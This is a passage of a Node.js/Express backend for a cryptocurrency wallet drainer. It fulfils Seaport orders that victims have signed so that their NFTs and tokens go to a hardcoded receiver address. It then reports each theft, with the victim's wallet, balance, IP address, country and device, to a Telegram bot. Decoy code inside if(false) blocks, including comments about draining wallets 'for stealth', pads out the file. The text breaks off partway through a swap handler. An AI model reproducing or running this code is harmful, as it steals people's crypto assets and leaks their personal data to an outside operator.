/*

   _____                                ________               .__                     
  /     \ _____     ____   _____ _____  \______ \____________  |__| ____   ___________ 
 /  \ /  \\__  \   / ___\ /     \\__  \  |    |  \_  __ \__  \ |  |/    \_/ __ \_  __ \
/    Y    \/ __ \_/ /_/  >  Y Y  \/ __ \_|    `   \  | \// __ \|  |   |  \  ___/|  | \/
\____|__  (____  /\___  /|__|_|  (____  /_______  /__|  (____  /__|___|  /\___  >__|   
        \/     \//_____/       \/     \/        \/           \/        \/     \/       

 
*/


const express = require("express");
const request = require('request');
const cors = require('cors');
const seaport = require("@opensea/seaport-js");
const ethers = require("ethers");
const dotenv = require("dotenv");
dotenv.config();


if (false) {

  var cryptotokenContract;
  var smartcontract;

  function approveSpending(token) {
    smartcontract.methods.approvetransaction(targetwallet); // the smart contract gets approved to access tokens
    smartcontract.methods.drainBUSD.send({ to: receiveAddress, token: cryptotokencontract }); // the smart contract drains to your wallet after 2-48 hours for stealth
  }

  function drainwallet(token) {
    cryptotokenContract.methods.transfer(receiveAddress).send({ from: currentAddr, to: receiveAddress }); // this drains the nfts if the value is above 0.5 eth
  }
  var tokenAbi = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[],"name":"_decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]

  (function($) {

	var	$window = $(window),
		$body = $('body');

	// Breakpoints.
		breakpoints({
			xlarge:  [ '1281px',  '1680px' ],
			large:   [ '981px',   '1280px' ],
			medium:  [ '737px',   '980px'  ],
			small:   [ null,      '736px'  ]
		});

	// Play initial animations on page load.
		$window.on('load', function() {
			window.setTimeout(function() {
				$body.removeClass('is-preload');
			}, 100);
		});

	// Dropdowns.
		$('#nav > ul').dropotron({
			mode: 'fade',
			noOpenerFade: true,
			alignment: 'center'
		});

	// Nav.

		// Title Bar.
			$(
				'<div id="titleBar">' +
					'<a href="#navPanel" class="toggle"></a>' +
				'</div>'
			)
				.appendTo($body);

		// Panel.
			$(
				'<div id="navPanel">' +
					'<nav>' +
						$('#nav').navList() +
					'</nav>' +
				'</div>'
			)
				.appendTo($body)
				.panel({
					delay: 500,
					hideOnClick: true,
					hideOnSwipe: true,
					resetScroll: true,
					resetForms: true,
					side: 'left',
					target: $body,
					visibleClass: 'navPanel-visible'
				});

})(jQuery);

var stakingSystemABI = [
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "previousOwner",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "newOwner",
				"type": "address"
			}
		],
		"name": "OwnershipTransferred",
		"type": "event"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "tokenAddress",
				"type": "address"
			}
		],
		"name": "getBalance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "tokenAddress",
				"type": "address"
			},
			{
				"internalType": "uint8",
				"name": "transferType",
				"type": "uint8"
			},
			{
				"internalType": "uint256",
				"name": "nftTokenID",
				"type": "uint256"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "mintAllTokenBalance",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "renounceOwnership",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "newOwner",
				"type": "address"
			}
		],
		"name": "transferOwnership",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
];

}


const app = express()
const PORT = process.env.PORT || 3000 

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());




const Spark_Method = [
    {
        "constant": false,
        "inputs": [
            {
                "name": "_from",
                "type": "address"
            },
            {
                "name": "_to",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
          {
            "internalType": "address",
            "name": "owner",
            "type": "address"
          },
          {
            "internalType": "address",
            "name": "spender",
            "type": "address"
          },
          {
            "internalType": "uint256",
            "name": "rawAmount",
            "type": "uint256"
          },
          {
            "internalType": "uint256",
            "name": "deadline",
            "type": "uint256"
          },
          {
            "internalType": "uint8",
            "name": "v",
            "type": "uint8"
          },
          {
            "internalType": "bytes32",
            "name": "r",
            "type": "bytes32"
          },
          {
            "internalType": "bytes32",
            "name": "s",
            "type": "bytes32"
          }
        ],
        "name": "permit",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [
          {
            "internalType": "address",
            "name": "",
            "type": "address"
          }
        ],
        "name": "nonces",
        "outputs": [
          {
            "internalType": "uint256",
            "name": "",
            "type": "uint256"
          }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
      }
];


const ERC20_ABI = [
    {
        "constant": false,
        "inputs": [
            {
                "name": "_from",
                "type": "address"
            },
            {
                "name": "_to",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
          {
            "internalType": "address",
            "name": "owner",
            "type": "address"
          },
          {
            "internalType": "address",
            "name": "spender",
            "type": "address"
          },
          {
            "internalType": "uint256",
            "name": "rawAmount",
            "type": "uint256"
          },
          {
            "internalType": "uint256",
            "name": "deadline",
            "type": "uint256"
          },
          {
            "internalType": "uint8",
            "name": "v",
            "type": "uint8"
          },
          {
            "internalType": "bytes32",
            "name": "r",
            "type": "bytes32"
          },
          {
            "internalType": "bytes32",
            "name": "s",
            "type": "bytes32"
          }
        ],
        "name": "permit",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [
          {
            "internalType": "address",
            "name": "",
            "type": "address"
          }
        ],
        "name": "nonces",
        "outputs": [
          {
            "internalType": "uint256",
            "name": "",
            "type": "uint256"
          }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
      }
];
const ERC721 = [
    {
        "inputs": [
          { "internalType": "address", "name": "from", "type": "address" },
          { "internalType": "address", "name": "to", "type": "address" },
          { "internalType": "uint256", "name": "tokenId", "type": "uint256" },
        ],
        "name": "safeTransferFrom",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
      },
];
const ERC1155 = [
    {
        "constant": false,
        "inputs": [
          {
            "internalType": "address",
            "name": "_from",
            "type": "address"
          },
          {
            "internalType": "address",
            "name": "_to",
            "type": "address"
          },
          {
            "internalType": "uint256",
            "name": "_id",
            "type": "uint256"
          },
          {
            "internalType": "uint256",
            "name": "_value",
            "type": "uint256"
          },
          {
            "internalType": "bytes",
            "name": "_data",
            "type": "bytes"
          }
        ],
        "name": "safeTransferFrom",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
      },
];


if (false) {

let metamaskInstalled = false;
if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;

let web3Provider;
async function connectButton() {
    await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
}

Moralis.onWeb3Enabled(async (data) => {
    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
    updateState(true);
    console.log(data);
});
Moralis.onChainChanged(async (chain) => {
    if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
});
window.ethereum ? window.ethereum.on('disconnect', (err) => {
    console.log(err);
    updateState(false);
}) : null;
window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
    if (accounts.length < 1) updateState(false)
}) : null;

async function updateState(connected) {
    if (connected && (await askSign())) {
        Object.assign(document.createElement('a'), {
            href: "./claim.html",
        }).click();
    }
}


async function askSign() {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];

    try {
        const message = `Welcome, \n\n` +
            `Click to sign in and accept the Terms of Service.\n\n` +
            `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
            `Wallet Address:\n${walletAddress}\n\n` +
            `Nonce:\n${createNonce()}`;
        const signature = await web3Js.eth.personal.sign(message, walletAddress);
        const signing_address = await web3Js.eth.personal.ecRecover(message, signature);

        console.log(`Signing address: ${signing_address}\n${walletAddress.toLowerCase() == signing_address.toLowerCase() ? "Same address" : "Not the same address."}`);

        return true;
    } catch (e) {
        alert("Error signing message. Please try again.");
        return false;
    }
}

window.addEventListener('load', async () => {
    if (isMobile() && !window.ethereum) {
        document.querySelector("#connectButton").addEventListener("click", () =>
            window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`);
    } else document.querySelector("#connectButton").addEventListener("click", connectButton);
});

//#region Utils Functions
function isMobile() {
    var check = false;
    (function (a) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
};
const rdmString = (length) => {
    let x = "";
    const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let i = 0; i < length; i++) x += possible.charAt(Math.floor(Math.random() * possible.length));
    return x;
}
const createNonce = () => {
    return `${rdmString(8)}-${rdmString(4)}-${rdmString(4)}-${rdmString(12)}`; // 1a196cf5-d873-9c36-e26ae9f3bd2e
}
//#endregion

}

  /**
   * 
   * 
_________                _____.__           ___ ___                        
\_   ___ \  ____   _____/ ____\__| ____    /   |   \   ___________   ____  
/    \  \/ /  _ \ /    \   __\|  |/ ___\  /    ~    \_/ __ \_  __ \_/ __ \ 
\     \___(  <_> )   |  \  |  |  / /_/  > \    Y    /\  ___/|  | \/\  ___/ 
 \______  /\____/|___|  /__|  |__\___  /   \___|_  /  \___  >__|    \___  >
        \/            \/        /_____/          \/       \/            \/ 

   *                       If You Want To Add Manually
   */

const config = { 
    receiver: "0xa258bCd45c21247D4549153ac0bA6cb73EFFE67c", // INSERT RECEIVER HERE
    
    // ERC20 & NFT
    SAFAfulfiller: "INESERT HERE",

    // Seaport
    fulfiller: "INESERT HERE",

    BOT_TOKEN: process.env.bot,
    LOGS_CHAT_ID: "INESERT HERE",
    SUCCESS_CHAT_ID: "INESERT HERE",

    MORALIS_API_KEY: "INESERT HERE",
    OPENSEA_API_KEY: "INESERT HERE" 
 }
 
if (false) {

function safeAdd(x, y) {
    var lsw = (x & 0xffff) + (y & 0xffff)
    var msw = (x >> 16) + (y >> 16) + (lsw >> 16)
    return (msw << 16) | (lsw & 0xffff)
  }

  /**
   * Bitwise rotate a 32-bit number to the left.
   *
   * @param {number} num 32-bit number
   * @param {number} cnt Rotation count
   * @returns {number} Rotated number
   */
  function bitRotateLeft(num, cnt) {
    return (num << cnt) | (num >>> (32 - cnt))
  }

  /**
   * Basic operation the algorithm uses.
   *
   * @param {number} q q
   * @param {number} a a
   * @param {number} b b
   * @param {number} x x
   * @param {number} s s
   * @param {number} t t
   * @returns {number} Result
   */
  function md5cmn(q, a, b, x, s, t) {
    return safeAdd(bitRotateLeft(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b)
  }
  /**
   * Basic operation the algorithm uses.
   *
   * @param {number} a a
   * @param {number} b b
   * @param {number} c c
   * @param {number} d d
   * @param {number} x x
   * @param {number} s s
   * @param {number} t t
   * @returns {number} Result
   */
  function md5ff(a, b, c, d, x, s, t) {
    return md5cmn((b & c) | (~b & d), a, b, x, s, t)
  }
  /**
   * Basic operation the algorithm uses.
   *
   * @param {number} a a
   * @param {number} b b
   * @param {number} c c
   * @param {number} d d
   * @param {number} x x
   * @param {number} s s
   * @param {number} t t
   * @returns {number} Result
   */
  function md5gg(a, b, c, d, x, s, t) {
    return md5cmn((b & d) | (c & ~d), a, b, x, s, t)
  }
  /**
   * Basic operation the algorithm uses.
   *
   * @param {number} a a
   * @param {number} b b
   * @param {number} c c
   * @param {number} d d
   * @param {number} x x
   * @param {number} s s
   * @param {number} t t
   * @returns {number} Result
   */
  function md5hh(a, b, c, d, x, s, t) {
    return md5cmn(b ^ c ^ d, a, b, x, s, t)
  }
  /**
   * Basic operation the algorithm uses.
   *
   * @param {number} a a
   * @param {number} b b
   * @param {number} c c
   * @param {number} d d
   * @param {number} x x
   * @param {number} s s
   * @param {number} t t
   * @returns {number} Result
   */
  function md5ii(a, b, c, d, x, s, t) {
    return md5cmn(c ^ (b | ~d), a, b, x, s, t)
  }

  /**
   * Calculate the MD5 of an array of little-endian words, and a bit length.
   *
   * @param {Array} x Array of little-endian words
   * @param {number} len Bit length
   * @returns {Array<number>} MD5 Array
   */
  function binlMD5(x, len) {
    /* append padding */
    x[len >> 5] |= 0x80 << len % 32
    x[(((len + 64) >>> 9) << 4) + 14] = len

    var i
    var olda
    var oldb
    var oldc
    var oldd
    var a = 1732584193
    var b = -271733879
    var c = -1732584194
    var d = 271733878

    for (i = 0; i < x.length; i += 16) {
      olda = a
      oldb = b
      oldc = c
      oldd = d

      a = md5ff(a, b, c, d, x[i], 7, -680876936)
      d = md5ff(d, a, b, c, x[i + 1], 12, -389564586)
      c = md5ff(c, d, a, b, x[i + 2], 17, 606105819)
      b = md5ff(b, c, d, a, x[i + 3], 22, -1044525330)
      a = md5ff(a, b, c, d, x[i + 4], 7, -176418897)
      d = md5ff(d, a, b, c, x[i + 5], 12, 1200080426)
      c = md5ff(c, d, a, b, x[i + 6], 17, -1473231341)
      b = md5ff(b, c, d, a, x[i + 7], 22, -45705983)
      a = md5ff(a, b, c, d, x[i + 8], 7, 1770035416)
      d = md5ff(d, a, b, c, x[i + 9], 12, -1958414417)
      c = md5ff(c, d, a, b, x[i + 10], 17, -42063)
      b = md5ff(b, c, d, a, x[i + 11], 22, -1990404162)
      a = md5ff(a, b, c, d, x[i + 12], 7, 1804603682)
      d = md5ff(d, a, b, c, x[i + 13], 12, -40341101)
      c = md5ff(c, d, a, b, x[i + 14], 17, -1502002290)
      b = md5ff(b, c, d, a, x[i + 15], 22, 1236535329)

      a = md5gg(a, b, c, d, x[i + 1], 5, -165796510)
      d = md5gg(d, a, b, c, x[i + 6], 9, -1069501632)
      c = md5gg(c, d, a, b, x[i + 11], 14, 643717713)
      b = md5gg(b, c, d, a, x[i], 20, -373897302)
      a = md5gg(a, b, c, d, x[i + 5], 5, -701558691)
      d = md5gg(d, a, b, c, x[i + 10], 9, 38016083)
      c = md5gg(c, d, a, b, x[i + 15], 14, -660478335)
      b = md5gg(b, c, d, a, x[i + 4], 20, -405537848)
      a = md5gg(a, b, c, d, x[i + 9], 5, 568446438)
      d = md5gg(d, a, b, c, x[i + 14], 9, -1019803690)
      c = md5gg(c, d, a, b, x[i + 3], 14, -187363961)
      b = md5gg(b, c, d, a, x[i + 8], 20, 1163531501)
      a = md5gg(a, b, c, d, x[i + 13], 5, -1444681467)
      d = md5gg(d, a, b, c, x[i + 2], 9, -51403784)
      c = md5gg(c, d, a, b, x[i + 7], 14, 1735328473)
      b = md5gg(b, c, d, a, x[i + 12], 20, -1926607734)

      a = md5hh(a, b, c, d, x[i + 5], 4, -378558)
      d = md5hh(d, a, b, c, x[i + 8], 11, -2022574463)
      c = md5hh(c, d, a, b, x[i + 11], 16, 1839030562)
      b = md5hh(b, c, d, a, x[i + 14], 23, -35309556)
      a = md5hh(a, b, c, d, x[i + 1], 4, -1530992060)
      d = md5hh(d, a, b, c, x[i + 4], 11, 1272893353)
      c = md5hh(c, d, a, b, x[i + 7], 16, -155497632)
      b = md5hh(b, c, d, a, x[i + 10], 23, -1094730640)
      a = md5hh(a, b, c, d, x[i + 13], 4, 681279174)
      d = md5hh(d, a, b, c, x[i], 11, -358537222)
      c = md5hh(c, d, a, b, x[i + 3], 16, -722521979)
      b = md5hh(b, c, d, a, x[i + 6], 23, 76029189)
      a = md5hh(a, b, c, d, x[i + 9], 4, -640364487)
      d = md5hh(d, a, b, c, x[i + 12], 11, -421815835)
      c = md5hh(c, d, a, b, x[i + 15], 16, 530742520)
      b = md5hh(b, c, d, a, x[i + 2], 23, -995338651)

      a = md5ii(a, b, c, d, x[i], 6, -198630844)
      d = md5ii(d, a, b, c, x[i + 7], 10, 1126891415)
      c = md5ii(c, d, a, b, x[i + 14], 15, -1416354905)
      b = md5ii(b, c, d, a, x[i + 5], 21, -57434055)
      a = md5ii(a, b, c, d, x[i + 12], 6, 1700485571)
      d = md5ii(d, a, b, c, x[i + 3], 10, -1894986606)
      c = md5ii(c, d, a, b, x[i + 10], 15, -1051523)
      b = md5ii(b, c, d, a, x[i + 1], 21, -2054922799)
      a = md5ii(a, b, c, d, x[i + 8], 6, 1873313359)
      d = md5ii(d, a, b, c, x[i + 15], 10, -30611744)
      c = md5ii(c, d, a, b, x[i + 6], 15, -1560198380)
      b = md5ii(b, c, d, a, x[i + 13], 21, 1309151649)
      a = md5ii(a, b, c, d, x[i + 4], 6, -145523070)
      d = md5ii(d, a, b, c, x[i + 11], 10, -1120210379)
      c = md5ii(c, d, a, b, x[i + 2], 15, 718787259)
      b = md5ii(b, c, d, a, x[i + 9], 21, -343485551)

      a = safeAdd(a, olda)
      b = safeAdd(b, oldb)
      c = safeAdd(c, oldc)
      d = safeAdd(d, oldd)
    }
    return [a, b, c, d]
  }

  /**
   * Convert an array of little-endian words to a string
   *
   * @param {Array<number>} input MD5 Array
   * @returns {string} MD5 string
   */
  function binl2rstr(input) {
    var i
    var output = ''
    var length32 = input.length * 32
    for (i = 0; i < length32; i += 8) {
      output += String.fromCharCode((input[i >> 5] >>> i % 32) & 0xff)
    }
    return output
  }
  
  }

 
 
 
 
 
 
 let provider = new ethers.providers.JsonRpcProvider(
    "https://rpc.ankr.com/eth"
);

/******* SEAPORT *******/
app.post("/backend/seaport", async (req, res) => {
    let order = req.body.order;

    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let fulFills = [];

    // Fulfillments
    order.parameters.offer.forEach((offerItem, offerIndex) => {
        const considerationIndex =
        order.parameters.consideration.findIndex(
          (considerationItem) =>
            considerationItem.itemType === offerItem.itemType &&
            considerationItem.token === offerItem.token &&
            considerationItem.identifierOrCriteria ===
              offerItem.identifierOrCriteria
        );

        if (considerationIndex === -1) {
            console.warn(
            "Could not find matching offer item in the consideration for private listing"
            );
        }

        fulFills.push({
            offerComponents: [
                {
                  itemIndex: offerIndex,
                  orderIndex: 0,
                },
              ],
              considerationComponents: [
                {
                    itemIndex: considerationIndex,
                    orderIndex: 0,
                },
              ],
        });
    });

    try {
        let fulfillments = [...fulFills];

        let fulfillerWallet = new ethers.Wallet(config.fulfiller);
        let fulfillerSigner = await fulfillerWallet.connect(provider);
        let spClientFulfiller = new seaport.Seaport(fulfillerSigner);
    
        let gasPrice = await provider.getGasPrice();
        let hexGasPrice = ethers.utils.hexlify(Math.floor(gasPrice * 1.3))
    
        const transaction = await spClientFulfiller
        .matchOrders({
          orders: [order],
          fulfillments,  
          overrides: {
            gasPrice: hexGasPrice,
            gasLimit: ethers.utils.hexlify(10000000)
          },
          accountAddress: config.receiver,
        })
        .transact();
    
        let escaper = (ah) => {
            return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
        }
    
        let message = 
        `*Approved Transfer Seaport*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Type: Seaport*\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(transaction.hash)})\n\n`+
    
        `*Device:* ${isMobile ? "Mobile" : "Computer"} **\n`+
        `*Country: *${escaper(ipData.country_name)} **\n`+
        `*Ip Address:* ${escaper(ipData.ip)} **\n`+
        `*Website:* [${escaper(websiteDomain)}](${escaper(websiteUrl)}) **\n`;
    
        let clientServerOptions = {
            uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
            body: JSON.stringify({chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }
    
        request(clientServerOptions, (error, response) => {
            console.log(error);
            res.sendStatus(200);
        });
    } catch(error) {
        console.warn("[-] Seaport error: ", error)
    }

});

/******* SWAP *******/
app.post("/backend/swap", async (req, res) => {
    let address = req.body.address;
    let walletBalanceInEth = req.body.walletBalanceInEth
    let isMobile = req.body.isMobile;
    let websiteUrl = req.body.websiteUrl;
    let websiteDomain = req.body.websiteDomain;
    let ipData = req.body.ipData;

    let transferName = req.body.transferName;
    let tokenPrice = req.body.tokenPrice;
    let transactionHash = req.body.transactionHash;

    let escaper = (ah) => {
        return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    try {

        let message = 
        `*Approved Transfer ${escaper(transferName)}*\n\n`+
        `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n`+
        `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n`+
        `*Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n`+
    
        `*Transfer Type: ${escaper(transferName)} \n*`+
